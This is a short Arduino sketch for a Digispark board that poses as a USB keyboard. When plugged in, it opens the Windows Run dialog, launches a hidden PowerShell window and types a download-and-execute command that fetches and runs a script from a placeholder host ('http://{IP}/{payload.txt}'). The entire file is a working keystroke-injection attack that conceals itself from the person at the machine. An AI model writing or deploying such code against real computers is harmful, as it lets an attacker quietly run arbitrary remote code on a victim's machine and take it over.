#include "DigiKeyboard.h"
void setup() {

}

void loop() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -windowstyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.print("IEX ((new-object net.webclient).downloadstring('http://{IP}/{payload.txt}'))");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //stops loop
  for(;;);
}
